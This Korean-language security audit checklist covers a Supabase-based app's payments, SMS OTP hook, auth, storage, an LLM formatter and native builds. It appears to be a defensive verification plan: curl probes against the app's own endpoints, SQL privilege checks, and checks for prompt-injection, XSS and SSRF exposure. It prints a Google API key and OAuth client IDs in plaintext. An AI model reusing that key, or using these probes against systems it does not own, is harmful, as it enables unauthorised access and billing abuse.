- [Supabase Dashboard → Edge Functions → kashikiri-confirm → Logs] `확정 실패(승인은 됨)` 문자열 검색 — 한 건이라도 있으면 그 orderId 는 토스에 돈이 있고 DB 는 pending 인 건이다(2번). 토스 콘솔에서 승인 내역을 찾아 수동 확정 또는 취소.
- [토스페이먼츠 콘솔] 해외 MID(playtaamusd · playtaamjpy) 의 승인 내역 통화·금액이 kashikiri_charges.pay_currency/pay_amount 와 일치하는지 표본 대조. amount_krw 는 실수령이 아니라 기준값이므로 정산서에서 차액을 어디에 흡수하는지 확인.
- [Supabase Dashboard → Database → Roles 또는 SQL] `select * from pg_default_acl where defaclnamespace='public'::regnamespace;` → objtype 'f' 에 anon/authenticated 가 있으면 앞으로 만드는 모든 함수에 자동 grant 가 붙는다. 이 프로젝트의 「revoke … from public」 관행이 충분한지 결정하는 근거.

### edge:taam-sms-hook
- Authentication → Hooks → Send SMS hook: Enabled · Type HTTPS · URL 이 정확히 https://edfsmzbcixfnqabrsvut.supabase.co/functions/v1/taam-sms-hook 인지. 발급된 Secret(v1,whsec_…)이 Edge Functions → Secrets 의 SEND_SMS_HOOK_SECRET 과 같은지. 검증: 헤더 없이 curl -X POST <URL> → 본문이 {"error":{"http_code":401,"message":"[sms-hook] 서명 헤더 누락…"}} 이어야 하고, 아무 값이나 webhook-id/timestamp(현재 epoch)/signature 를 넣으면 「서명 불일치」가 나와야 한다. 둘 다 아니면 시크릿이 비어 있거나 다른 코드가 배포된 것.
- Edge Functions → taam-sms-hook → Settings: Verify JWT 가 OFF 인지(훅 동작에 필요). 동시에 **다른 함수들은 ON 인지** 한 번에 훑는다 — 이 함수만 예외여야 한다. 배포된 index.ts 가 저장소 파일과 같은지(대시보드 붙여넣기 배포라 어긋날 수 있음).
- Authentication → Rate Limits: 'Rate limit for sending SMS'(기본 30/시간 · 프로젝트 전역) 를 실제 회원 규모에 맞게 낮추고, 'Minimum interval between OTP requests'(sms_max_frequency, 기본 60초) 와 'Rate limit for verifying OTP'(무차별 대입) 값을 확인한다. 훅에는 제한이 없으므로 여기가 유일한 발송 상한이다.
- Authentication → Attack Protection: Captcha(Turnstile/hCaptcha) 가 꺼져 있을 것 — 켜면 앱의 signInWithOtp/updateUser 에 captchaToken 을 넣는 코드 변경이 함께 필요하다(안 넣고 켜면 로그인 전면 중단).
- Authentication → Providers → Phone: 'Enable phone signups' 상태. 앱 가입 모드가 shouldCreateUser=true 라 켜져 있어야 하는데, 그러면 초대코드 없이도 auth.users 유령 행이 생긴다. OTP expiry 180초·6자리인지. 유령 정리: select count(*) from auth.users where phone is not null and phone_confirmed_at is null and created_at < now()-interval '1 day'.
- SQL Editor(finding 1 라이브 확인): select id, phone, phone_change, phone_change_sent_at from auth.users where coalesce(phone_change,'')<>''; — 결과가 있으면 그 회원들의 로그인 OTP 는 지금 phone_change 번호로 가고 있다. 훅 수정 전이라도 이 행들의 phone_change 를 '' 로 비워야 한다.
- Solapi 콘솔: ① 국제문자 발송 차단(사용 안 함) 설정 ② 일 발송 한도·잔액 부족 알림 ③ 최근 발송 내역에서 수신번호가 010 이 아닌 건이 있는지(있으면 SMS 펌핑 흔적) ④ 발신번호(SOLAPI_SENDER) 등록 상태.
- Edge Functions → taam-sms-hook → Logs: '[sms-hook] 발송 성공' 건수와 Solapi 콘솔 발송 건수를 같은 기간으로 대조한다(차이가 나면 GoTrue 재시도 중복 또는 접수 거부). '서명 불일치' 로그가 반복되면 외부에서 URL 을 찌르고 있는 것.
- 시크릿 로테이션 절차: Send SMS hook 의 Secret 을 재발급하면 즉시 SEND_SMS_HOOK_SECRET 도 바꿔야 한다 — 코드는 시크릿 하나만 받으므로(pipe 구분 다중 시크릿 미지원) 순서가 어긋나면 그 사이 모든 SMS 로그인이 「서명 불일치」로 막힌다.

### edge:toss-billing-issue
- Edge Functions → toss-billing-issue → 「Verify JWT」 가 켜져 있는가. config.toml 은 대시보드 배포라 반영되지 않는다(파일 4행 주석). 코드가 스스로 Bearer→getUser 를 하므로 꺼져 있어도 치명적이진 않지만, 켜져 있어야 anon 호출이 함수 실행(콜드스타트·JSON 파싱)까지도 못 온다.
- Edge Functions → Secrets: TOSS_BILLING_SECRET_KEY 가 실제로 설정돼 있는가. 없으면 TOSS_SECRET_KEY(일반결제 MID playtauif6)로 폴백하는데(index.ts:51), 그 키로는 토스가 「자동결제 계약 없음」으로 거절한다 — 가용성 문제이자, 두 MID 시크릿을 한 함수가 번갈아 쓰는 구조인지 확인.
- SQL Editor 에서 실제 적용 상태 대조(저장소 SQL ≠ DB): `select policyname, cmd, qual, with_check from pg_policies where tablename='billing_keys' union all select 'colpriv:'||grantee||':'||privilege_type||':'||coalesce(column_name,'*'),'','','' from information_schema.column_privileges where table_name='billing_keys';` — UPDATE 정책이 컬럼 제한 없이 살아 있는지, INSERT 정책이 정말 없는지(있으면 브라우저가 임의 빌링키를 심을 수 있다).
- 고아 빌링키 존재 여부: 토스 개발자센터(bill_taam315) 의 발급 빌링키 수 vs `select count(*) from billing_keys` 비교. 차이가 있으면 save_failed 로 토스에만 남은 키가 있는 것 — 1·6번 발견의 전제.
- 토스 개발자센터 → 빌링 MID 의 리다이렉트 URL(successUrl/failUrl) 허용 도메인이 taam-app.vercel.app 으로 제한돼 있는가. 제한돼 있으면 4번 발견(제3자가 자기 페이지로 authKey 를 받는 경로)의 첫 단계가 막힌다 — 토스가 도메인 화이트리스트를 제공하는지 포함해 확인.
- Edge Function 로그 보존: index.ts:79 `console.warn('customerKey 불일치', customerKey, user.id)` 로 uid 두 개가 로그에 남는다. 로그 보존 기간과 접근 권한(누가 Logs 를 보는가) 확인.
- Supabase Auth → JWT expiry(기본 3600s): 이 함수는 access token 만 보므로 단일기기 규칙 3겹의 잔여 창(1h) 동안 탈취된 토큰으로 카드 등록·기본카드 변경이 가능하다. CLAUDE.md 가 이미 900s 단축을 권한다 — 적용됐는지.

### edge:notify-visit-reminder
- Edge Functions → notify-visit-reminder → 「Verify JWT」가 켜져 있는지 (config.toml 은 기본 true 지만 대시보드 배포라 보장 없음. 꺼져 있으면 토큰 없이도 누구나 호출 가능 — 발견 3 이 더 넓어진다)
- Integrations/Cron(또는 cron.job)에서 notify-visit-reminder 잡: 존재 여부, 스케줄이 02:00 UTC(=11:00 KST)인지, 게스트 만료 잡(10:00 KST)과 겹치지 않는지, Authorization 헤더가 Vault 의 **legacy service_role JWT**(eyJ… 200자+)인지 — anon 키나 sb_secret_ 형식이면 안 됨. 발견 3 의 수정(service key 비교) 뒤에는 반드시 service_role 이어야 함
- pg_cron 에 `taam_visit_reminder_notify` 라는 잡이 남아 있지 않은지: `select jobname, schedule, command from cron.job;` — 있으면 SQL 이 먼저 넣어 푸시가 사라진다(visit_reminder.sql:163-166)
- 실행 결과 확인(Succeeded 를 믿지 말 것): `select status_code, created, left(coalesce(content,''),200) from net._http_response order by created desc limit 10;` → 200 과 `{"ok":true,"made":N,"push_sent":…}` 여야 함. 500 이면 발견 2(캐스트 예외) 의심, push_failed>0 이면 발견 4
- 함수 실행 권한(발견 1): `select has_function_privilege('anon','public.taam_visit_reminder_notify()','execute') anon_exec, has_function_privilege('authenticated','public.taam_visit_reminder_notify()','execute') auth_exec, has_function_privilege('anon','public.taam_guest_expiry_notify()','execute') g_anon, has_function_privilege('authenticated','public.taam_guest_expiry_notify()','execute') g_auth;` → 전부 false 여야 함
- notif_prefs 오염 행(발견 2): `select id, notif_prefs from public.profiles where exists (select 1 from jsonb_each(notif_prefs) where jsonb_typeof(value) <> 'boolean');` → 0건
- 중복 발송 흔적(발견 3): `select payload->>'ticket_id' t, payload->>'days' d, count(*) from public.notifications where type='visit_reminder' group by 1,2 having count(*)>1;` → 0건
- Edge Function 로그에서 notify-visit-reminder 의 실행 시간·타임아웃 여부(대상 회원 수가 늘면 순차 send-push 루프가 한도에 걸릴 수 있음 — 발견 4)

### edge:notify-guest-expiry
- Edge Functions → notify-guest-expiry → 「Verify JWT」가 켜져 있는지. (켜져 있어도 anon key JWT 는 통과하므로 finding 3 의 코드 수정은 별개로 필요)
- Edge Functions → notify-guest-expiry 에 실제 배포된 코드가 저장소 index.ts(82줄, 2026-09-07 판)와 같은지 — 대시보드 붙여넣기 배포라 저장소와 어긋날 수 있다
- Integrations → Cron → `notify-guest-expiry-daily` 의 명령: Authorization 헤더가 Vault 의 **service_role legacy JWT(eyJ…)** 인지 anon key 인지. finding 3 수정(service_role 만 허용) 을 배포하기 전에 반드시 확인 — anon 이면 배포 순간 Cron 이 403 으로 죽는다. `select jobname, schedule, left(command,200) from cron.job where jobname ilike '%guest%'` 로 보고, 키가 명령에 평문으로 박혀 있지 않은지도 본다
- SQL Editor: `select r, has_function_privilege(r,'public.taam_guest_expiry_notify()','execute') as guest, has_function_privilege(r,'public.taam_visit_reminder_notify()','execute') as visit from unnest(array['anon','authenticated','service_role']) r;` → anon·authenticated 가 **false** 여야 정상. true 면 finding 2 확정(익명 RPC 호출 가능)
- SQL Editor: `select tgname, pg_get_triggerdef(oid) from pg_trigger where tgrelid='public.profiles'::regclass and not tgisinternal order by 1;` → guest_expires_at 을 되돌리는 트리거가 있는지. 저장소에는 없다(finding 1). `select policyname, cmd, qual, with_check from pg_policies where tablename='profiles' and cmd='UPDATE';` 로 「profiles update own」이 컬럼 제한 없이 살아 있는지도 같이 본다
- SQL Editor: `select status_code, created, left(coalesce(content,''),200) from net._http_response order by created desc limit 10;` → 매일 10시 KST 에 200 + `{"ok":true,"admin":…}` 본문이 찍히는지 (CLAUDE.md 「Succeeded 를 믿지 말 것」). 아울러 `select count(*), min(created_at), max(created_at) from public.notifications where type like 'guest_expiry_%' and created_at::date = current_date;` 로 오늘 알림이 10시 이전에 생긴 적이 있는지 — 있으면 누군가 밖에서 부른 것
- SQL Editor: `select user_id, type, payload->>'guest_id', payload->>'days', count(*) from public.notifications where type like 'guest_expiry_%' group by 1,2,3,4 having count(*)>1;` → 동시 실행으로 생긴 중복이 이미 있는지 (finding 5)
- SQL Editor: `select id, display_name, guest_expires_at, guest_extended_cnt from public.profiles where upper(coalesce(membership_tier,''))='A' and guest_expires_at > now() + interval '91 day';` → 서버 규칙(최대 now+90일)보다 먼 기한을 가진 게스트가 있으면 finding 1 이 이미 악용됐거나 수동 조작 흔적
- Edge Function Secrets: SUPABASE_SERVICE_ROLE_KEY 가 send-push 의 `t === SERVICE_KEY` 비교와 같은 값인지 (같은 프로젝트 자동 주입이면 동일 — 수동으로 새 형식 sb_secret_ 키를 덮어썼다면 send-push 내부 호출이 401 로 전부 실패해 push_failed 만 쌓인다)

### taam-format
- [필수] Edge Functions → taam-format → 소스 열기: `Authorization` 헤더의 토큰으로 `auth.getUser()` 를 부르고 `profiles.role` 이 `super_admin`/`superadmin` 인지 확인해 403 을 내는 코드가 **memo 검사·Google·Claude 호출보다 앞에** 있는가 (lineage-summarize index.ts:394-408 과 같은 모양). 없으면 anon key 만으로 호출된다 → 발견 1 을 high 로 올린다.
- [필수] 대시보드 소스가 옛 api/taam-format.js(커밋 07c44f2, `import Anthropic from '@anthropic-ai/sdk'` + `export default async function handler(req,res)`) 를 Deno 로 옮긴 것인지 확인. 그 파일에는 인증 코드가 한 줄도 없다.
- [필수] 터미널 실측(이 세션은 프록시가 supabase.co 를 막아 못 했음): ① `curl -i -X POST https://edfsmzbcixfnqabrsvut.supabase.co/functions/v1/taam-format -H 'Content-Type: application/json' -d '{}'` (헤더 없음) → 401 이어야 정상. ② `-H "Authorization: Bearer <anon key>"` 로 같은 요청 → 401/403 이어야 정상. **`400 memo 필드가 필요합니다` 가 오면 회원 검증 없음(확정)**. ③ 일반 회원(role=user) JWT 로 같은 요청 → 403 이어야 정상. `{}` 본문이라 모델·Google 호출은 일어나지 않는다.
- Edge Functions → taam-format → 설정: 「Verify JWT with legacy secret」 이 ON 인지 (OFF 면 헤더 없이도 함수 코드가 돈다). 단 ON 이어도 anon key 는 통과하므로 위 소스 확인을 대신하지 못한다.
- 소스: `taam_rate_hit` 호출 여부(키·한도·창). 없으면 발견 3 확정.
- 소스: `memo` 에 `typeof === 'string'` + 최대 길이(예: 500) 검사가 있는가. 옛 소스는 3자 하한만 있었다.
- 소스: 프롬프트에 memo 와 Google `name/formatted_address/website/types` 가 구분자 없이 그대로 들어가는가, 「데이터로만 취급」 지시가 있는가.
- 소스: 모델 응답 JSON 을 스키마로 검증하는가 (local_popularity/price_tier/genre_en enum, 배열 길이, 문자열 길이, `<`/`>` 제거). 없으면 클라이언트 innerHTML(발견 2)에 직결된다.
- 소스: 오류 응답에 `raw`(모델 원문)·`err.message`·`type`·`usage` 를 그대로 돌려주는가 (옛 소스는 그랬다). 클라이언트 86637-86641 이 `json.raw` 를 기대하므로 아마 그렇다.
- 소스: Google Places 응답의 `website` 나 다른 URL 을 `fetch` 하는가 (SSRF). 옛 소스는 maps.googleapis.com 고정 호스트만 불렀다 — 포팅 시 추가되지 않았는지.
- 소스: CORS 가 `Access-Control-Allow-Origin: *` 인가. Bearer 방식이라 위험은 낮지만 `https://taam-app.vercel.app`·capacitor 스킴으로 좁힐 수 있다.
- 소스: 모델 ID(옛 소스 `claude-sonnet-4-5`)·`max_tokens`(1500)·호출 횟수(1회인지 재시도 루프인지).
- Edge Function Secrets: `ANTHROPIC_API_KEY`·`GOOGLE_MAPS_API_KEY` 가 Secrets 에만 있고 소스 본문에 문자열로 박혀 있지 않은가.
- Google Cloud Console → 해당 Maps API 키: 「API restrictions」 가 Places API 로 제한돼 있고, 서버용 키(HTTP referrer 아님)인가. 발견 1 이 사실이면 이 키가 외부에 대리 노출된 셈이므로 키 회전을 검토.
- Edge Functions → taam-format → Invocations/Logs: 호출량·호출 시각·User-Agent 가 슈퍼어드민의 실제 사용(하루 몇 건)과 맞는가. 이상 호출이 있으면 발견 1 이 이미 악용된 것.
- Anthropic Console·Google Cloud Billing: taam-format 몫의 비용이 사용 빈도 대비 이상 없는가.
- Supabase → Table Editor → restaurants: `source_type='taam_personal'` 행 중 이름·concierge_note 에 `<`·`>`·`onerror`·지시문 같은 이상 문자열이 없는지 (발견 2·6 의 사후 흔적). 같은 `google_place_id` 중복 행이 있는지 (발견 5 이중 클릭).

### storage
- Storage → Policies: restaurant-videos 의 INSERT/UPDATE 정책 이름·본문·roles — authenticated 전원(조건 bucket_id 만)인지 확인. 「Authenticated can manage videos j552aw_0/_1/_2」 처럼 대시보드 생성 정책이 남아 있는지 (j552aw_3 만 DROP 됐다)
- Storage → Policies: chef_photos_admin_write/update/delete · rest_photos_admin_write/update/delete 의 qual 과 with_check 에 `is_admin` 이 남아 있는지 (cleanup_legacy_privileges.sql 적용 여부; UPDATE 정책은 with_check 도 따로 볼 것)
- Storage → Buckets: 7개 버킷(taam-photos·splash-media·partner-logos·chef-photos·restaurant-photos·restaurant-videos·carousel-photos)의 Public 여부, File size limit, Allowed MIME types — 저장소 SQL 은 셋 다 비어 있다
- Project Settings → Storage: 전역 업로드 크기 한도(Global file size limit) 값 — 버킷 한도가 없으면 이것이 유일한 상한
- SQL Editor: `select pg_get_functiondef('public.is_superadmin()'::regprocedure)` — 본문이 profiles.role in ('super_admin','superadmin') 인지, is_admin 이나 이메일 목록이 아닌지
- SQL Editor: `select proname, proacl from pg_proc where proname in ('is_super_admin','_taam_uid_is_super','is_superadmin')` — anon/authenticated 에 EXECUTE 가 열려 있는지 (is_super_admin(uuid) 는 오라클)
- SQL Editor: `select count(*) from profiles where is_admin is true` 와 `select column_name from information_schema.columns where table_name='profiles' and column_name='is_admin'` — 컬럼 존재·true 인원
- SQL Editor: `select policyname, cmd, roles, qual, with_check from pg_policies where schemaname='storage' and tablename='objects' order by 1` 전체를 떠서 sql/ 에 기록 (저장소에 CREATE 가 없는 버킷 4개)
- Storage → restaurant-videos 객체 목록: 확장자가 mp4/webm/mov 가 아니거나 hero_ 접두가 아닌 파일이 있는지 (이미 악용됐는지)
- Database → Tables → restaurants: photo_card/photo_hero/detail_photos 에 'data:image' 로 시작하는 값이 있는지 (`sql/photo_base64_targets.sql` 실행) — 파트너 저장 경로가 base64 를 다시 넣고 있다

### auth
- Authentication → Providers → Email: 「Allow new users to sign up」 — 코드가 signup 모드에서 shouldCreateUser:true 를 쓰므로 지금은 ON 일 것. 1번 발견을 고칠 때 OFF 로. 「Confirm email」 ON, 「Secure email change」(양쪽 확인) ON, 「Secure password change」(최근 인증 요구) ON — 앱의 updateUser({password}) 는 재인증 없이 호출된다.
- Authentication → Providers → Phone: 「Allow new users to sign up」 동일. SMS provider = Send SMS Hook(taam-sms-hook) 인지, 훅 시크릿(SEND_SMS_HOOK_SECRET, v1,whsec_…)이 Edge Function Secrets 에 있는지. OTP 길이 6, 만료 ≤ 180초(문자 본문이 '3분' 이라 적음 — 값이 맞는지).
- Authentication → Providers → Google / Apple: 「Allow new users to sign up」, Authorized Client IDs 에 정확히 248142320623-qhjtrcrt3b5mit5o6mlidbs69pgjt3l7 (web), 248142320623-v6i8b0j85vh8stq6nleij217cm7osiq4 (iOS), com.playtaam.app.signin (Apple) 만. Apple 은 iOS bundle id(com.playtaam.app) 도 필요.
- Authentication → URL Configuration: Site URL = https://taam-app.vercel.app (정확히). Redirect URLs 에 `https://taam-app.vercel.app/**` 는 허용되나 `https://*.vercel.app/**`, `http://localhost*`, `capacitor://*` 같은 와일드카드가 남아 있으면 프리뷰 배포·로컬로 토큰이 리다이렉트된다. 앱은 redirectTo = origin+pathname 이라 `/card`, `/apply/` 등 경로별 항목이 필요하면 경로만 나열.
- Authentication → Rate Limits: SMS 발송(시간당·번호당), 이메일 발송, OTP verify 시도, token refresh, anonymous — 각 값. 특히 「Rate limit for sending SMS」 를 낮게(예 5/시간). 4·5번 발견의 실질 방어.
- Authentication → Attack Protection: Captcha(hCaptcha/Turnstile) — 현재 앱은 captchaToken 을 보내지 않으므로 OFF 일 것. 켜려면 vpSend/socialLogin/signInWithPassword 에 토큰 전달 코드가 먼저 필요. 「Leaked password protection」(HaveIBeenPwned) ON, 최소 비밀번호 길이 ≥ 8 + 문자 종류 요구(앱 _memberPwdValidate 규칙과 일치시키기).
- Authentication → Sessions/JWT: JWT expiry 3600 → 900 권고(CLAUDE.md 8·9번 시나리오). 「Single session per user」 는 슈퍼어드민·심사계정 면제가 안 되니 켜지 말 것(앱 규칙과 충돌). Refresh token rotation ON + reuse interval 10초. Time-box user sessions / inactivity timeout 값.
- Authentication → Providers → Anonymous sign-ins: OFF 인지 확인(켜져 있으면 anon key 만으로 authenticated JWT 가 나와 1번이 더 쉬워진다).
- Authentication → Hooks: Send SMS 훅이 taam-sms-hook 을 가리키고 「Enabled」 인지, 훅 시크릿을 회전한 뒤 Edge Secrets 도 같이 바꿨는지. Send Email 훅·Custom Access Token 훅이 뜻하지 않게 등록돼 있지 않은지.
- Authentication → Users: `email_confirmed_at is null` 유령 계정 수(fix_email_exists_confirmed_only.sql 의 진단 쿼리) — 많으면 4번의 남용 흔적. `banned_until` 이 찍힌 탈퇴 계정이 있는지(현재 코드는 안 찍음).
- Database → Policies → public.profiles: SELECT 정책 전체 목록. 저장소에는 「super_admin can read all profiles」·「venue admin for requesters」만 있고 「본인 행」 정책 파일이 없다 — 대시보드에 `using(true)` 류의 전원 읽기 정책이 있으면 자가 가입 계정으로 회원 PII 전체가 읽힌다. UPDATE 「profiles update own」 이 컬럼 제한 없이 phone/email 을 허용하는지(2번).
- Database → Policies → public.invite_codes: RLS 가 켜져 있는지와 SELECT 정책 — 저장소에 파일이 없다. authenticated 가 넓게 읽으면 초대자 이름·전화·이메일 열거(8번). `member_id = auth.uid()` 또는 슈퍼어드민으로만.
- Database → Policies → public.active_sessions / Realtime: sql/active_sessions.sql 그대로인지(본인 행만), Realtime publication 에 active_sessions 가 있는지 — 없으면 1겹이 죽고 워치독(60초)만 남는다.
- Edge Functions → verify-invite / consume-invite → 「Verify JWT」: 가입 시점에는 회원 JWT 가 없으므로 OFF 여야 정상. 대신 함수 안의 taam_rate_hit 이 살아 있는지 로그로 확인.
- Storage → taam-photos 버킷 정책: authenticated 업로드가 열려 있으면 1번의 자가 가입 계정이 업로드 가능(sql/storage_close_anon_write.sql 적용 여부).

### native
- GitHub: main 브랜치 보호 규칙(리뷰 필수·force-push 금지·관리자 포함) — server.url 원격 로드라 main 푸시 = 네이티브 앱 즉시 변경
- GitHub Secrets: VERCEL_DEPLOY_HOOK 이 언제 만들어졌는지·채팅/문서에 붙여넣은 적 없는지, 필요 시 Vercel 에서 훅 재생성(회전)
- Vercel: Settings → Git → Production Branch 가 main 뿐인지, Preview 배포 URL 이 검색엔진/외부에 노출되지 않는지(Preview Protection), 팀 멤버·토큰 목록
- Google Cloud Console → API 키 AIzaSyBzzMJ637TFCVIabUZvLCGF7wz7zhRpoGY: 애플리케이션 제한(HTTP referrer: taam-app.vercel.app, playtaam.com) 과 API 제한(Maps Embed·Maps JS·Places·Geocoding) 이 걸려 있는지, 일일 예산 알림
- Google Play Console → 앱 무결성 → 앱 서명 키 인증서 SHA-256 이 .well-known/assetlinks.json 의 지문(3D:59:CB:…:3A:DE)과 같은지 — Play App Signing 이 다시 서명하면 App Links 검증이 조용히 실패해 결제 복귀가 크롬으로 샌다. `adb shell pm get-app-links com.playtaam.app` 로 verified 확인
- Codemagic: 환경변수 그룹 appstore_signing / android_keystore 의 각 변수가 Secure 로 표시되는지, 빌드 아티팩트(signing-debug.txt·build-debug.txt) 접근 권한이 팀 내부로 한정되는지, 과거 빌드 로그에 키 재료가 찍힌 적 없는지
- Apple Developer: Sign in with Apple 클라이언트 시크릿(JWT, 180일 만료 — scripts/gen-apple-secret.js) 갱신 일정. 만료되면 소셜 로그인이 조용히 실패
- Supabase → Authentication → URL Configuration: Redirect URLs 가 https://taam-app.vercel.app/** 와 https://playtaam.com/** 만인지(호스트 와일드카드·http 항목 없음). 소셜 로그인 redirectTo 가 location.origin 을 쓰므로 Preview 도메인이 추가돼 있으면 열어둔 셈
- Supabase → Edge Functions: kashikiri-confirm 은 Verify JWT OFF 가 의도(비회원 링크 결제). 그 밖의 함수(toss-billing-issue, partner-account, notify-* 등)는 Verify JWT ON 인지 한 번 훑기
- Firebase/FCM: 서버 키(레거시) 가 비활성인지, 서비스계정 키가 Edge Function 시크릿에만 있는지. APNs 키(.p8) 도 마찬가지
- Google Cloud OAuth 동의화면: Production 게시 여부와 Test users — Testing 상태면 100명 제한으로 소셜 로그인이 특정 사용자에게만 실패
- Supabase → Auth → JWT expiry(현재 3600s 로 추정): 단일 기기 3겹의 잔여 창. 900s 로 줄일지 결정
- Vercel Deployments: 라이브 커밋과 main HEAD 일치 여부(하루 100건 한도로 밀린 배포가 없는지) — 보안 수정이 라이브에 안 올라간 상태로 남을 수 있다